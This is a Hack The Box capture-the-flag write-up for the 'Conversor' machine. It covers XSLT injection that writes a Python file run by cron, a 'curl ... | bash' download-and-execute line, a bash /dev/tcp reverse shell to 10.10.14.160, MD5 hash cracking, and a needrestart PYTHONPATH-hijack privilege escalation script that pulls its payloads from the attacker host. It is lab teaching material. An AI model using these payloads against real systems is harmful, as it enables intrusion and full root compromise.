# Conversor

> https://app.hackthebox.com/machines/Conversor

<img width="1006" height="362" alt="capa" src="https://github.com/user-attachments/assets/80ee9eba-3257-4ae9-b3bf-9d233841506f" />

## Table of Contents

- [About](#about)
- [References](#references)
- [Reconnaissance](#reconnaissance)
- [Source Code Analysis](#source-code-analysis)
- [Initial Access](#initial-access)
- [Lateral Movement](#lateral-movement)
- [Privilege Escalation](#privilege-escalation)
- [Conclusion](#conclusion)

## About

Conversor was a Medium Linux machine running a Flask web application designed to convert Nmap XML scan results into HTML format using XSLT stylesheets. The challenge revolves around exploiting XSLT injection vulnerabilities to achieve arbitrary file write, leveraging a cron job for remote code execution, and cracking weak password hashes to gain SSH access. Privilege escalation is achieved through the exploitation of a vulnerable needrestart binary that can be executed with sudo privileges, ultimately granting root access.

## References

- [CVE-2024-48990 Details](https://nvd.nist.gov/vuln/detail/CVE-2024-48990)
- [Hash Cracking with Hashcat](https://hashcat.net/hashcat/)
- [XSLT Injection for Dummies: INE](https://ine.com/blog/xslt-injections-for-dummies)
- [PayloadsAllTheThings: XSLT Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSLT%20Injection/README.md)
- [Needrestart LPE: Ubuntu Security Notice](https://ubuntu.com/blog/needrestart-local-privilege-escalation)

## Reconnaissance

The port scan revealed two ports listening on TCP (22/80): OpenSSH 8.9p1 and Apache httpd 2.4.52 running on Ubuntu.

<img width="1651" height="512" alt="0" src="https://github.com/user-attachments/assets/3b1d30ca-2d5f-4aee-842c-c459dd507ff4" />

The web server redirected to `http://conversor.htb`, so the domain was added to `/etc/hosts`.

The website presented itself as "Conversor": a service that transforms Nmap XML scan results into a more visually appealing format using XSLT stylesheets. Users could upload their XML files along with custom XSLT sheets, or download a template XSLT file provided by the service.

<img width="1920" height="614" alt="1" src="https://github.com/user-attachments/assets/81f9a903-7a1f-4ce0-9ede-112973962521" />

After registering an account and logging in, the conversion functionality was tested by uploading an Nmap scan XML along with the provided XSLT template.

<img width="1920" height="819" alt="2" src="https://github.com/user-attachments/assets/be4d00de-aa6c-4bcf-80f6-be7e775e297f" />

To identify the XSLT processor and its capabilities, a custom XSLT file was uploaded that extracted system properties:

```xml
<p><xsl:value-of select="system-property('xsl:version')" /></p>
<p><xsl:value-of select="system-property('xsl:vendor')" /></p>
<p><xsl:value-of select="system-property('xsl:vendor-url')" /></p>
```

The results confirmed the server was using `libxslt` version 1.0, which supports the EXSLT `document()` function for writing files:

```
1.0
libxslt
http://xmlsoft.org/XSLT/
```

<img width="1918" height="534" alt="5" src="https://github.com/user-attachments/assets/d247010c-57e8-4232-bbf4-ba0728639aa9" />

## Source Code Analysis

The application provided its source code for download at http://conversor.htb/static/source_code.tar.gz.

The installation documentation (`install.md`) revealed a critical cron job that executed all Python files in `/var/www/conversor.htb/scripts/` every minute as the `www-data` user:

`* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done`

The `/convert` route in `app.py` contained an XSLT injection vulnerability. While the XML parser had protections against XXE attacks, the XSLT processor had no restrictions:

```python
@app.route('/convert', methods=['POST'])
def convert():
    xml_file = request.files['xml_file']
    xslt_file = request.files['xslt_file']
    
    # Saves files without validation
    xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)
    xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)
    xml_file.save(xml_path)
    xslt_file.save(xslt_path)
    
    # XSLT processed without sanitization
    parser = etree.XMLParser(resolve_entities=False, no_network=True)
    xml_tree = etree.parse(xml_path, parser)
    xslt_tree = etree.parse(xslt_path)
    transform = etree.XSLT(xslt_tree)
    result_tree = transform(xml_tree)
```

## Initial Access

With the ability to control XSLT processing and knowledge of the cron job, an exploit chain was crafted to achieve remote code execution.

A malicious XSLT payload was created using the `exslt:document()` function to write a Python file to `/var/www/conversor.htb/scripts/shell.py`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
    version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:shell="http://exslt.org/common"
    extension-element-prefixes="shell">

    <xsl:template match="/">
        <shell:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import os
os.system("curl 10.10.14.160:8000/shell.sh|bash")
        </shell:document>
    </xsl:template>
</xsl:stylesheet>
```

This Python file would download and execute a reverse shell script from an HTTP server:

```bash
bash -i >& /dev/tcp/10.10.14.160/9001 0>&1
```

After uploading the malicious XSLT file through the web interface, the cron job executed the Python file within a minute, establishing a reverse shell as `www-data`.

<img width="1905" height="560" alt="7" src="https://github.com/user-attachments/assets/be973da8-2f51-4566-b600-6c78a385f8ea" />

## Lateral Movement

After gaining access as `www-data`, the SQLite database used by the application was examined at `instance/users.db`. The database contained MD5 password hashes for registered users, including one for `fismathack`:

```
fismathack:5b5c3ac3a1c897c94caad48e6c71fdec
```

<img width="1907" height="483" alt="8" src="https://github.com/user-attachments/assets/4af94322-93ad-42ca-b979-db07e33fb848" />

The MD5 hash was quickly cracked using the _rockyou.txt_ wordlist with hashcat, revealing the plaintext password: `Keepmesafeandwarm`. SSH access was then obtained using these credentials.

## Privilege Escalation

The user's privileges were enumerated using `sudo -ll`, which revealed that `fismathack` could run `/usr/sbin/needrestart` as any user without a password:

```
Sudoers entry:
    RunAsUsers: ALL
    RunAsGroups: ALL
    Options: !authenticate
    Commands:
        /usr/sbin/needrestart
```

<img width="1352" height="681" alt="9" src="https://github.com/user-attachments/assets/230c6c0a-e352-4e2e-bfce-d3928a03f177" />

Checking the version revealed `needrestart 3.7`, which is vulnerable to multiple CVEs related to local privilege escalation (CVE-2024-48990, CVE-2024-48991, CVE-2024-48992).

The vulnerability allows arbitrary code execution through environment variable manipulation when `needrestart` scans for outdated libraries. An exploit was crafted that hijacked Python's import mechanism by creating malicious modules in `/tmp/malicious/`.

The exploit script `runner.sh` set up the malicious environment:

```bash
#!/bin/bash
set -e
cd /tmp
mkdir -p malicious/importlib

curl http://10.10.14.160:8000/__init__.so -o /tmp/malicious/importlib/__init__.so
curl http://10.10.14.160:8000/e.py -o /tmp/malicious/e.py

echo "Run: 'sudo needrestart' in another shell."
cd /tmp/malicious; PYTHONPATH="$PWD" python3 e.py 2>/dev/null
```

The malicious Python module spawned a root shell:

```python
import pty; pty.spawn("/bin/bash")
```

After setting up the HTTP server and executing the exploit, running `sudo needrestart` in another SSH session triggered the vulnerability and granted root access.

<img width="1904" height="995" alt="10" src="https://github.com/user-attachments/assets/4b428946-0951-48a2-b89b-8e42a85abd50" />

## Conclusion

The Conversor machine demonstrated a multi-stage attack path from web application exploitation to privilege escalation. The key lessons learned from this machine included:

- **XSLT injection remained a critical vulnerability**: The lack of XSLT input validation allowed arbitrary file write capabilities that bypassed XML security controls

- **Source code disclosure accelerated exploitation**: Access to the application's source code revealed the cron job mechanism that enabled RCE

- **Weak password hashing was exploited**: MD5 hashes without salts were quickly cracked using standard wordlists

- **Misconfigured sudo privileges provided escalation paths**: Running `needrestart` with sudo privileges exposed the system to known CVEs that granted root access
